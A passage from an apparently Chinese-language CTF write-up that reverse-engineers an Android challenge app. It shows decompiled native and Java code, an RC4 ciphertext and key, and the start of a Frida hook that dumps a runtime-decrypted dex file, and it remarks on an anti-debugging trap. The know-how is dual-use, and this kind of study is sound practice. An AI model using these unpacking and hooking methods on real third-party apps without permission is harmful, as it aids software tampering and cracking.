class="string">&quot;(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line">  v10 = sub_1510(a1, (__int64)<span class="string">&quot;zunjia.dex&quot;</span>);</span><br><span class="line">  v9 = sub_1510(a1, (__int64)<span class="string">&quot;com.nobody.zundujiadu&quot;</span>);</span><br><span class="line">  v8 = sub_1510(a1, (__int64)<span class="string">&quot;encode&quot;</span>);</span><br><span class="line">  __memcpy_chk(v17, &amp;unk_3950, <span class="number">43LL</span>, <span class="number">43LL</span>);											<span class="comment">//密文</span></span><br><span class="line">  sub_E20((__int64)v17, v14);														<span class="comment">//RC4</span></span><br><span class="line">  v7 = sub_1540(a1, <span class="number">0x2Bu</span>);</span><br><span class="line">  sub_1570(a1, v7, <span class="number">0</span>, <span class="number">0x2Bu</span>, (__int64)v17);</span><br><span class="line">  v6 = sub_15B0(a1, v13, v11, a3, v10, v9, v8, v7);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_1360(a1, v6, (__int64)&amp;v16);</span><br><span class="line">  __android_log_print(<span class="number">4LL</span>, <span class="string">&quot;Native&quot;</span>, <span class="string">&quot;Result is %s\nTry decrypto it, you will get flag! But realy?&quot;</span>, v4);	<span class="comment">//输出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现加密方式是典型的RC4加密，密文也已知，为<font color=lime><strong>[0x7A, 0xC7, 0xC7, 0x94, 0x51, 0x82, 0xF5, 0x99, 0x0C, 0x30, 0xC8, 0xCD, 0x97, 0xFE, 0x3D, 0xD2, 0xAE, 0x0E, 0xBA, 0x83, 0x59, 0x87, 0xBB, 0xC6, 0x35, 0xE1, 0x8C, 0x59, 0xEF, 0xAD, 0xFA, 0x94, 0x74, 0xD3, 0x42, 0x27, 0x98, 0x77, 0x54, 0x3B, 0x46, 0x5E, 0x95]</strong></font>，但密钥却未知，结合java层的功能和对check的调用，猜测程序的目的是通过点击图片来生成的string对密文进行解密并输出日志，没有明显的判断对错的结构，遍历0.o、o.0和The length is too large开头的长度36位以内的密钥却没有得到任何一组可打印字符的明文，考虑是对字符串进行了某种处理，此外，启动adb查看logcat日志时发现，点击图片后输出的日志中的result是经过了base64加密的，且还是换表base64，所有字符串都以3结尾，至此得到大致的程序逻辑：通过点击图片产生的密钥，经过某种处理后用作RC4的密钥对密文进行加密，再经过未知的换表base64输出加密结果，查看Dexcall类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody.zunjia;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DexCall</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">native</span> File <span class="title function_">copyDexFromAssets</span><span class="params">(Context context, String str, File file)</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;zunjia&quot;</span>);</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;check&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">callDexMethod</span><span class="params">(Context context, String dexFileName, String className, String methodName, Object input)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dexDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getCacheDir(), <span class="string">&quot;dex&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (dexDir.mkdir() || dexDir.setWritable(<span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">dexFile</span> <span class="operator">=</span> copyDexFromAssets(context, dexFileName, dexDir);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (dexFile.exists() &amp;&amp; dexFile.setReadOnly()) &#123;</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">                    <span class="type">DexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexFile.getAbsolutePath(), dexDir.getAbsolutePath(), <span class="literal">null</span>, classLoader);</span><br><span class="line">                    Class&lt;?&gt; targetClass = dexClassLoader.loadClass(className);</span><br><span class="line">                    Constructor&lt;?&gt; constructor = targetClass.getConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">                    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> targetClass.getMethod(methodName, input.getClass());</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> targetMethod.invoke(instance, input);</span><br><span class="line">                    dexFile.delete();</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dexFile.exists()) &#123;</span><br><span class="line">                    dexFile.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合values中的string.xml，callDexMethod方法将尝试从zunjia.dex文件中加载<code>com.nobody.zundujiadu</code>类，并查找名为 <code>encode</code> 的方法，使用传入的字符串 s 作为参数调用该方法，并将结果返回，但却没有找到encode方法，查看zunjia.dex发现居然是未知二进制文件，没有检测到dex格式，查看libzunjia.so，列出所有关键函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sub_0FF0	.text	0000000000000FF0	0000025A	000000B8		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1250	.text	0000000000001250	00000116	00000048		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1370	.text	0000000000001370	0000015A	00000048		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_14D0	.text	00000000000014D0	00000038	0000001A		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1510	.text	0000000000001510	00000086	00000030		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_15A0	.text	00000000000015A0	00000031	00000012		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_15E0	.text	00000000000015E0	00000284	000000C8		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1870	.text	0000000000001870	000003DA	000000B8		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1C50	.text	0000000000001C50	00000021	0000000C		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1C80	.text	0000000000001C80	000000A7	00000038		R	.	.	.	.	.	B	T	.</span><br><span class="line">sub_1D30	.text	0000000000001D30	0000012F	00000058		R	.	.	.	.	.	B	.	.</span><br><span class="line">sub_1E60	.text	0000000000001E60	00000183	00000078		R	.	.	.	.	.	B	.	.</span><br><span class="line">sub_1FF0	.text	0000000000001FF0	00000119	00000088		R	.	.	.	.	.	B	.	.</span><br><span class="line">sub_2110	.text	0000000000002110	00000119	00000088		R	.	.	.	.	.	B	T	.</span><br><span class="line">Java_co...	.text	0000000000002230	000006A2	00000988		R	.	.	.	.	.	B	T	.</span><br></pre></td></tr></table></figure>
<p>其中<code>sub_15E0</code>、<code>sub_2110</code>和<code>sub_0FF0</code>、<code>sub_1FF0</code>是两组相近的函数（第一组是静态分析看上去被调用的函数），查看其中的加载方法（最后一个函数）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_nobody_zunjia_DexCall_copyDexFromAssets</span><span class="params">(</span></span><br><span class="line"><span class="params">        __int64 a1,</span></span><br><span class="line"><span class="params">        __int64 a2,</span></span><br><span class="line"><span class="params">        __int64 a3,</span></span><br><span class="line"><span class="params">        __int64 a4,</span></span><br><span class="line"><span class="params">        __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+14h] [rbp-96Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [rsp+24h] [rbp-95Ch]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+28h] [rbp-958h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+30h] [rbp-950h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+38h] [rbp-948h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+48h] [rbp-938h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+54h] [rbp-92Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> fd; <span class="comment">// [rsp+5Ch] [rbp-924h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+60h] [rbp-920h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v25; <span class="comment">// [rsp+68h] [rbp-918h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+70h] [rbp-910h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+78h] [rbp-908h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [rsp+80h] [rbp-900h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+88h] [rbp-8F8h]</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+90h] [rbp-8F0h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+98h] [rbp-8E8h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [rsp+A0h] [rbp-8E0h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+A8h] [rbp-8D8h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [rsp+C0h] [rbp-8C0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v38; <span class="comment">// [rsp+164h] [rbp-81Ch]</span></span><br><span class="line">  <span class="type">char</span> v39[<span class="number">32</span>]; <span class="comment">// [rsp+170h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// [rsp+190h] [rbp-7F0h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+570h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v42; <span class="comment">// [rsp+978h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v42 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v36 = a3;</span><br><span class="line">  v33 = sub_28E0(a1, a3);</span><br><span class="line">  v32 = sub_2910(a1, v33, <span class="string">&quot;getAssets&quot;</span>, <span class="string">&quot;()Landroid/content/res/AssetManager;&quot;</span>);</span><br><span class="line">  v31 = sub_2950(a1, v36, v32, v5, v6, v7);</span><br><span class="line">  v30 = AAssetManager_fromJava(a1, v31);</span><br><span class="line">  v29 = sub_28E0(a1, a5);</span><br><span class="line">  v28 = sub_2910(a1, v29, <span class="string">&quot;getAbsolutePath&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>);</span><br><span class="line">  v27 = sub_2950(a1, a5, v28, v8, v9, v10);</span><br><span class="line">  v26 = sub_2A40(a1, v27, <span class="number">0LL</span>);</span><br><span class="line">  v25 = (<span class="type">const</span> <span class="type">char</span> *)sub_2A40(a1, a4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400u</span>LL);</span><br><span class="line">  sub_2A80((<span class="type">unsigned</span> <span class="type">int</span>)s, <span class="number">1024</span>, <span class="number">1024</span>, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%s/%s&quot;</span>, v26, (_DWORD)v25);</span><br><span class="line">  v24 = AAssetManager_open(v30, v25, <span class="number">2LL</span>);	<span class="comment">//打开dex</span></span><br><span class="line">  <span class="keyword">if</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(s, <span class="number">66</span>, <span class="number">420LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = *(_DWORD *)__errno();</span><br><span class="line">      v11 = (<span class="type">int</span> *)__errno();</span><br><span class="line">      v12 = strerror(*v11);</span><br><span class="line">      __android_log_print(<span class="number">6LL</span>, <span class="string">&quot;Native&quot;</span>, <span class="string">&quot;Failed to open target file: %s, errno: %d, error message: %s&quot;</span>, s, v17, v12);</span><br><span class="line">      AAsset_close(v24);</span><br><span class="line">      sub_2B60(a1, a4, v25);</span><br><span class="line">      sub_2B60(a1, v27, v26);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = AAsset_read(v24, v39, <span class="number">1024LL</span>);					<span class="comment">//一次读取1024字节</span></span><br><span class="line">        <span class="keyword">if</span> ( v22 &lt;= <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v22 % <span class="number">8</span> )										<span class="comment">//8字节解密一次</span></span><br><span class="line">          v16 = (v22 + <span class="number">8</span> - v22 % <span class="number">8</span>) / <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v16 = v22 / <span class="number">8</span>;</span><br><span class="line">        ptr = <span class="built_in">malloc</span>(<span class="number">8</span> * v16);</span><br><span class="line">        sub_2110(v39, (<span class="type">unsigned</span> <span class="type">int</span>)v22, ptr, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">8</span> * v16));	<span class="comment">//解密函数？</span></span><br><span class="line">        __write_chk(fd, ptr, <span class="number">8</span> * v16, <span class="number">-1LL</span>);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      close(fd);</span><br><span class="line">      v38 = open(s, <span class="number">66</span>, <span class="number">420LL</span>);</span><br><span class="line">      __read_chk(v38, v39, <span class="number">1024LL</span>, <span class="number">1024LL</span>);</span><br><span class="line">      ftruncate(v38, v40);</span><br><span class="line">      close(v38);</span><br><span class="line">      AAsset_close(v24);</span><br><span class="line">      v20 = sub_2910(a1, v29, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>);</span><br><span class="line">      v19 = sub_2BA0(a1, (__int64)s);</span><br><span class="line">      v18 = sub_2BD0(a1, v29, v20, v19, v13, v14);</span><br><span class="line">      sub_2B60(a1, a4, v25);</span><br><span class="line">      sub_2B60(a1, v27, v26);</span><br><span class="line">      sub_2CC0(a1, v19);</span><br><span class="line">      <span class="keyword">return</span> v18;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    __android_log_print(<span class="number">6LL</span>, <span class="string">&quot;Native&quot;</span>, <span class="string">&quot;Failed to open asset file: %s&quot;</span>, v25);</span><br><span class="line">    sub_2B60(a1, a4, v25);</span><br><span class="line">    sub_2B60(a1, v27, v26);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看加密函数sub_2110以及一个相似的版本sub_1FF0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2110</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v8[<span class="number">2</span>]; <span class="comment">// [rsp+70h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __memset_chk(a3, <span class="number">0LL</span>, a4, <span class="number">-1LL</span>);</span><br><span class="line">  __memcpy_chk(a3, a1, a2, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a4 / <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_15E0(*(_QWORD *)(a3 + <span class="number">8LL</span> * i), (__int64) <span class="string">&quot;SevenIsBeautiful&quot;</span>, v8); <span class="comment">//解密函数？和密钥</span></span><br><span class="line">    *(_QWORD *)(a3 + <span class="number">8LL</span> * i) = v8[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1FF0</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v8[<span class="number">2</span>]; <span class="comment">// [rsp+70h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __memset_chk(a3, <span class="number">0LL</span>, a4, <span class="number">-1LL</span>);</span><br><span class="line">  __memcpy_chk(a3, a1, a2, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a4 / <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_FF0(*(_QWORD *)(a3 + <span class="number">8LL</span> * i), (__int64) <span class="string">&quot;SevenIsBeautiful&quot;</span>, v8); <span class="comment">//解密函数？和密钥</span></span><br><span class="line">    *(_QWORD *)(a3 + <span class="number">8LL</span> * i) = v8[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中sub_2110所对应的加密过程会在sub_1E60陷入死循环（有一个while v12&gt;1但却没有更新v12的循环），而sub_1FF0则没有这一步骤，并且sub_1FF0也没有任何xref，猜测可能存在反调试，sub_1FF0即为正确的加密，由于复现这个加密过于麻烦，直接使用<code>frida</code>动调，在DexCall方法delete掉解密的zunjia.dex前dump这个dex：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        payload = message[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> payload.get(<span class="string">&#x27;type&#x27;</span>) == <span class="string">&#x27;dex_content&#x27;</span>:</span><br><span class="line">            dex_content = <span class="built_in">bytes</span>(payload.get(<span class="string">&#x27;content&#x27;</span>))</span><br><span class="line">            output_path = <span class="string">&quot;E:/CTF/zunjia.dex&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(dex_content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Dex dumped to <span class="subst">&#123;os.path.abspath(output_path)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript注入代码</span></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">File</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.io.File&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">FileInputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.io.FileInputStream&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">ByteArrayOutputStream</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.io.ByteArrayOutputStream&#x27;</span>);</span><br><span class="line">    <span class="title class_">File</span>.<span class="property">delete</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> path = <span class="variable language_">this</span>.<span class="title function_">getAbsolutePath</span>();</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">endsWith</span>(<span class="string">&#x27;zunjia.dex&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Detected deletion of Dex file: &#x27;</span> + path);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">exists</span>()) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;File does not exist: &quot;</span> + path);</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">delete</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">canRead</span>()) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;No read permission for the file: &quot;</span> + path);</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">delete</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> fis = <span class="title 